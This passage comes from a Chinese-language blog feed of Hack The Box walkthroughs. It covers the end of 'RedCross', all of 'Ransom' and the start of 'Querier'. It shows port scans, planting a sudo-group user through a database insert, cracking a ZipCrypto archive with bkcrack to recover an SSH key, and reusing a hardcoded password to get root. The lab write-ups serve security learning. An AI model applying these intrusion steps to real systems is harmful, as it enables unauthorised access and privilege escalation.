class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ ssh penel@10.10.10.113<br>penel@10.10.10.113<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux redcross 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">penel@redcross:~$ sudo -l</span><br><span class="hljs-string"></span><br><span class="hljs-string">We trust you have received the usual lecture from the local System</span><br><span class="hljs-string">Administrator. It usually boils down to these three things:</span><br><span class="hljs-string"></span><br><span class="hljs-string">    #1) Respect the privacy of others.</span><br><span class="hljs-string">    #2) Think before you type.</span><br><span class="hljs-string">    #3) With great power comes great responsibility.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[sudo] password for penel: </span><br><span class="hljs-string">Sorry, user penel may not run sudo on redcross.</span><br><span class="hljs-string">penel@redcross:~$ </span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">penel@redcross:~$ grep sudo /etc/group<br>sudo:x:27:<br></code></pre></td></tr></table></figure><p>再借助postgresql创建一个拥有sudo的权限的用户：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">insert</span> into passwd_table (username, passwd, gid, homedir) values (<span class="hljs-string">&#x27;sudopenel&#x27;</span>, <span class="hljs-string">&#x27;<span class="hljs-variable">$1</span><span class="hljs-variable">$u4kkiGYK</span><span class="hljs-variable">$odKUMl6W</span>/7V7Q4KeyDOc21&#x27;</span>, <span class="hljs-number">27</span>, <span class="hljs-string">&#x27;/home/penelope&#x27;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">penel@redcross:~$ ssh sudopenel@127.0.0.1<br>The authenticity of host <span class="hljs-string">&#x27;127.0.0.1 (127.0.0.1)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ECDSA key fingerprint is SHA256:yd04sZox5Ub78YD9IP7Yrslhv2TgP7lcFNiOBpZjCfk.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="hljs-string">Failed to add the host to the list of known hosts (/home/penelope/.ssh/known_hosts).</span><br><span class="hljs-string">sudopenel@127.0.0.1&#x27;</span>s password: <br>Linux redcross 4.9.0-6-amd64 <span class="hljs-comment">#1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>sudopenel@redcross:~$ sudo -l<br><br>We trust you have received the usual lecture from the <span class="hljs-built_in">local</span> System<br>Administrator. It usually boils down to these three things:<br><br>    <span class="hljs-comment">#1) Respect the privacy of others.</span><br>    <span class="hljs-comment">#2) Think before you type.</span><br>    <span class="hljs-comment">#3) With great power comes great responsibility.</span><br><br>[sudo] password <span class="hljs-keyword">for</span> sudopenel: <br>Matching Defaults entries <span class="hljs-keyword">for</span> sudopenel on redcross:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User sudopenel may run the following commands on redcross:<br>    (ALL : ALL) ALL<br>sudopenel@redcross:~$ sudo su<br>root@redcross:/home/penelope<span class="hljs-comment"># ls</span><br>haraka  user.txt<br>root@redcross:/home/penelope<span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br>root@redcross:/home/penelope<span class="hljs-comment"># cat user.txt </span><br>94.............................<br>root@redcross:/home/penelope<span class="hljs-comment"># cat /root/root.txt </span><br>f0f.........................<br>root@redcross:/home/penelope<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Ransom</title>
    <link href="/post/HackTheBox-Ransom.html"/>
    <url>/post/HackTheBox-Ransom.html</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/Ransom.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs BASH">Crazy:~/HackThebox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.11.153<br>[sudo] crazyinside 的密码：<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-23 02:14:47 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 22/tcp on 10.10.11.153                                    <br>Discovered open port 80/tcp on 10.10.11.153                                    <br>                                                                                                                                                                                                                                                                                 <br>Crazy:~/HackThebox$ sudo nmap -sC -sV 10.10.11.153 -oN Ransom -p22,80                <br>Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-23 10:18 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.153<br>Host is up (0.18s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 ea8421a3224a7df9b525517983a4f5f2 (RSA)<br>|   256 b8399ef488beaa01732d10fb447f8461 (ECDSA)<br>|_  256 2221e9f485908745161f733641ee3b32 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))<br>|_http-server-header: Apache/2.4.41 (Ubuntu)<br>| http-title:  Admin - HTML5 Admin Template<br>|_Requested resource was http://10.10.11.153/login<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 12.72 seconds<br>zsh: segmentation fault  sudo nmap -sC -sV 10.10.11.153 -oN Ransom -p22,80<br>                                                                                                                                                                                                                                                                                 <br>Crazy:~/HackThebox$ curl -I 10.10.11.153     <br>HTTP/1.1 302 Found<br>Date: Tue, 23 Aug 2022 02:21:36 GMT<br>Server: Apache/2.4.41 (Ubuntu)<br>Cache-Control: no-cache, private<br>Location: http://10.10.11.153/login<br>Set-Cookie: XSRF-TOKEN=eyJpdiI6ImZzbUZENE9xSUx4TjJRNzRTWWtaZEE9PSIsInZhbHVlIjoicGJ2ZzhOb2NYVmQzeHAwdmtpWnpSWjQ3cFdtbEFpL3ZJQTA4aGNLSHhZaHNqVE9mcDVOU0hyTit6VVBPdGpGZTMzdTJXZExIRzNnM0xKa2ZzQm5mNUtSVXBlV0FsTVNnZnppNk1PTzBnN0dEVU1Bd2Y0djZNMjc3cjBCU2tRZC8iLCJtYWMiOiI0N2VjNzM4NTQ2ZWE3NjEwZTU3ZTI2NWJmMGJhNDZlNWMwZWNlODBkNWJjYzkwODVkMGFlNTFmNGFmMWQyMmU3IiwidGFnIjoiIn0%3D; expires=Tue, 23-Aug-2022 04:21:36 GMT; Max-Age=7200; path=/; samesite=lax<br>Set-Cookie: laravel_session=eyJpdiI6InRQd0htU0o2ZmhFNjdRdzZ6VFVFNmc9PSIsInZhbHVlIjoiQlFEYjF4Y0hGenZ4Vk1iM0Q2N1NDaFJieEdtMWZJZnJhVkg0VSt3WDRIRCtPZEZnOGUvOE5PNnFKSU5DTmZSNjkxK21OSUpxZWF5dEJ3eUE0QmZHZ1JjRGVvc1RDejhFOUh1OE8zbXNhY05IcVM1ODVaT2k4SWFLSXlHYmdoNUsiLCJtYWMiOiIwNGJiYzBmMWE0MjZjYzE5ZTlmNmNhM2JiYTg4YTIxYWZhM2U1Yzg1NTBiMTgxYWMwNmQyZGNiZjUwNTc0YmM4IiwidGFnIjoiIn0%3D; expires=Tue, 23-Aug-2022 04:21:36 GMT; Max-Age=7200; path=/; samesite=lax<br>Content-Type: text/html; charset=UTF-8<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220823102530030.png" alt="image-20220823102530030"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220823102848035.png" alt="image-20220823102848035"></p><p>Get方式提交的参数。我尝试了目录枚举，它很慢，预计要40多分钟。我尝试了SQL注入，也不行。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/login?password=password</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>ransom.htb<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://ransom.htb/login<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>XSRF-TOKEN=eyJpdiI6Ik9odlh4bTlFK0NkbW0yaC8xczBSUHc9PSIsInZhbHVlIjoialhJb0VPSU9ZclJPL0dEem0xamJNVkpwL3R2TC9yazhxMWRyN0pCeFczTVdKSEpENHo4ZW1Mckp3Qk1DdWp6UmQrdUNxWG1iY0cvQWxjdTVOWnlzT0hjVzdFZjVmUGIxa3VZYkJQeUtwNW5Ba1ZTcXNMWGtQYzlLWW9QY3g4MzYiLCJtYWMiOiI1MGFkMTAxNjJhMTdlMTEyZWQ5YzcyNDRlMDZiYmFkYzYxNGM0YzJmMjYzZWFmYmQ4OGE5ZDY1YzI1OWIzMGVhIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkZGRHR5ZGpleFIrWTM2V2M2WllUWWc9PSIsInZhbHVlIjoiWUpXTEYxV1FKZ2R4Y3dZbk9GUHhDM0g1YkdiT1RCQVg2OWNuRWFnVW9RSFJkUncyaDcxWnN4K3Q2MzhmemZjRXNUZlFlZk5VR1F6bWxCN3Z6SVVVUDdxSCtpZHg5Tit2QWdSN1pzU2JlckJEam9GRHQyUUhpckVBSTQzQU51Sy8iLCJtYWMiOiJhYmQ2Y2JkNmFlNjU5YjJjYmJhOGQ4ZWE1MzNiMTg2M2QzMGVmNWI3NDYxZDNkMmU0MDNhNmRkYjIzYTY2MWI3IiwidGFnIjoiIn0%3D<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br></code></pre></td></tr></table></figure><p>右键源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">$(<span class="hljs-variable language_">document</span>).<span class="hljs-title function_">ready</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript"></span><br><span class="language-javascript">  $(<span class="hljs-string">&#x27;#loginform&#x27;</span>).<span class="hljs-title function_">submit</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript"></span><br><span class="language-javascript">      $.<span class="hljs-title function_">ajax</span>(&#123;</span><br><span class="language-javascript">          <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;GET&quot;</span>,</span><br><span class="language-javascript">          <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;api/login&#x27;</span>,</span><br><span class="language-javascript">          <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">              <span class="hljs-attr">password</span>: $(<span class="hljs-string">&quot;#password&quot;</span>).<span class="hljs-title function_">val</span>()</span><br><span class="language-javascript">          &#125;,</span><br><span class="language-javascript">          <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)</span><br><span class="language-javascript">          &#123;</span><br><span class="language-javascript">              <span class="hljs-keyword">if</span> (data === <span class="hljs-string">&#x27;Login Successful&#x27;</span>) &#123;</span><br><span class="language-javascript">                  <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&#x27;/&#x27;</span>);</span><br><span class="language-javascript">              &#125;</span><br><span class="language-javascript">              <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-javascript">                (<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;alert&#x27;</span>)).<span class="hljs-property">style</span>.<span class="hljs-property">visibility</span> = <span class="hljs-string">&#x27;visible&#x27;</span>;</span><br><span class="language-javascript">                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;alert&#x27;</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-string">&#x27;Invalid Login&#x27;</span>;</span><br><span class="language-javascript"></span><br><span class="language-javascript">              &#125;</span><br><span class="language-javascript">          &#125;</span><br><span class="language-javascript">      &#125;);     </span><br><span class="language-javascript">      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; </span><br><span class="language-javascript">  &#125;);</span><br><span class="language-javascript">&#125;);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>当提交密码会请求api&#x2F;login。</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220823111730598.png" alt="image-20220823111730598"></p><p>POST方式不被允许：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220823111820758.png" alt="image-20220823111820758"></p><p>支持GET方式json格式提交</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220823111938928.png" alt="image-20220823111938928"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220823112016664.png" alt="image-20220823112016664"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220823112334681.png" alt="image-20220823112334681"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220823112437618.png"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220823112802925.png" alt="image-20220823112802925"></p><p>都是ZipCrypto加密方式。顺着这个方式我去搜寻了很多资料。什么原理我也没搞懂。记不住原理就记步骤嘛。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ <span class="hljs-built_in">cp</span> ~/.bash_logout bash_logout<br><br>Crazy:~/HackThebox$ zip plain.zip bash_logout <br>  adding: bash_logout (deflated 28%)<br>                                                                                                                                                                                     <br>Crazy:~/HackThebox$ bkcrack -C uploaded-file-3422.zip -c .bash_logout -P plain.zip -p bash_logout <br>bkcrack 1.5.0 - 2022-07-07<br>[11:41:09] Z reduction using 151 bytes of known plaintext<br>100.0 % (151 / 151)<br>[11:41:10] Attack on 56903 Z values at index 6<br>Keys: 7b549874 ebc25ec5 7e465e18<br>75.6 % (43025 / 56903)<br>[11:42:09] Keys<br>7b549874 ebc25ec5 7e465e18<br><br>Crazy:~/HackThebox$ bkcrack -C uploaded-file-3422.zip -k 7b549874 ebc25ec5 7e465e18 -U uploaded-file-3422-pass.zip pass<br>bkcrack 1.5.0 - 2022-07-07<br>[11:45:08] Writing unlocked archive uploaded-file-3422-pass.zip with password <span class="hljs-string">&quot;pass&quot;</span><br>100.0 % (9 / 9)<br>Wrote unlocked archive.<br></code></pre></td></tr></table></figure><p>现在我可以用pass解开新生成的zip：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ unzip uploaded-file-3422-pass.zip<br>Archive:  uploaded-file-3422-pass.zip<br>[uploaded-file-3422-pass.zip] .bash_logout password: <br>  inflating: .bash_logout            <br>  inflating: .bashrc                 <br>  inflating: .profile                <br>   creating: .cache/<br> extracting: .cache/motd.legal-displayed  <br> extracting: .sudo_as_admin_successful  <br>   creating: .ssh/<br>  inflating: .ssh/id_rsa             <br>  inflating: .ssh/authorized_keys    <br>  inflating: .ssh/id_rsa.pub         <br>  inflating: .viminfo                <br>                                                                                                                                                                                     <br>Crazy:~/HackThebox$ <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox/.ssh$ ssh -i id_rsa htb@10.10.11.153                                                  <br>The authenticity of host <span class="hljs-string">&#x27;10.10.11.153 (10.10.11.153)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:hE6H4DrsHebfs+gclhz9SL77tMpy8aKR3vp8Y0NRDvY.</span><br><span class="hljs-string">This key is not known by any other names</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.11.153<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-77-generic x86_64)</span><br><span class="hljs-string"></span><br><span class="hljs-string"> * Documentation:  https://help.ubuntu.com</span><br><span class="hljs-string"> * Management:     https://landscape.canonical.com</span><br><span class="hljs-string"> * Support:        https://ubuntu.com/advantage</span><br><span class="hljs-string"></span><br><span class="hljs-string">0 updates can be applied immediately.</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">The list of available updates is more than a week old.</span><br><span class="hljs-string">To check for new updates run: sudo apt update</span><br><span class="hljs-string">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Last login: Mon Aug 22 15:11:40 2022 from 10.10.14.11</span><br><span class="hljs-string">htb@ransom:~$ </span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">htb@ransom:/srv/prod$ grep -r <span class="hljs-string">&quot;Invalid Password&quot;</span><br>app/Http/Controllers/AuthController.php:        <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;Invalid Password&quot;</span>;<br>htb@ransom:/srv/prod$ <span class="hljs-built_in">cat</span> app/Http/Controllers/AuthController.php<br>&lt;?php<br><br>namespace App\Http\Controllers;<br><br>use App\Models\User;<br>use Illuminate\Http\Request;<br>use App\Http\Requests\RegisterRequest;<br>use Illuminate\Support\Facades\Auth;<br>use Illuminate\Support\Facades\Hash;<br><br><br><br>class AuthController extends Controller<br>&#123;<br>    /**<br>     * Display login page.<br>     * <br>     * @<span class="hljs-built_in">return</span> \Illuminate\Http\Response<br>     */<br>    public <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">show_login</span></span>()<br>    &#123;<br>        <span class="hljs-built_in">return</span> view(<span class="hljs-string">&#x27;auth.login&#x27;</span>);<br>    &#125;<br><br><br><br>    /**<br>     * Handle account login<br>     * <br>     */<br>    public <span class="hljs-keyword">function</span> customLogin(Request <span class="hljs-variable">$request</span>)<br>    &#123;<br>        <span class="hljs-variable">$request</span>-&gt;validate([<br>            <span class="hljs-string">&#x27;password&#x27;</span> =&gt; <span class="hljs-string">&#x27;required&#x27;</span>,<br>        ]);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$request</span>-&gt;get(<span class="hljs-string">&#x27;password&#x27;</span>) == <span class="hljs-string">&quot;UHC-March-Global-PW!&quot;</span>) &#123;<br>            session([<span class="hljs-string">&#x27;loggedin&#x27;</span> =&gt; True]);<br>            <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;Login Successful&quot;</span>;<br>        &#125;<br>  <br>        <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;Invalid Password&quot;</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">htb@ransom:/srv/prod$ su root<br>Password: <br>root@ransom:/srv/prod<span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br>root@ransom:/srv/prod<span class="hljs-comment"># cat /root/root.txt </span><br>93df............................<br>root@ransom:/srv/prod<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Quserier</title>
    <link href="/post/HackTheBox-Quserier.html"/>
    <url>/post/HackTheBox-Quserier.html</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/Querier.png" alt="Querier"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.125<br>[sudo] crazyinside 的密码：<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-30 12:21:58 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 49665/tcp on 10.10.10.125                                 <br>Discovered open port 1433/tcp on 10.10.10.125                                  <br>Discovered open port 49671/tcp on 10.10.10.125                                 <br>Discovered open port 49668/tcp on 10.10.10.125                                 <br>Discovered open port 49666/tcp on 10.10.10.125                                 <br>Discovered open port 49667/tcp on 10.10.10.125                                 <br>Discovered open port 5985/tcp on 10.10.10.125                                  <br>Discovered open port 139/tcp on 10.10.10.125                                   <br>Discovered open port 445/tcp on 10.10.10.125                                   <br>Discovered open port 49664/tcp on 10.10.10.125                                 <br>Discovered open port 47001/tcp on 10.10.10.125                                 <br>Discovered open port 49670/tcp on 10.10.10.125                                 <br>Discovered open port 49669/tcp on 10.10.10.125                                 <br>Discovered open port 135/tcp on 10.10.10.125  <br></code></pre></td></tr></table></figure><p>高端口一般都是RPC,常用业务端口基本都是1-10000：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 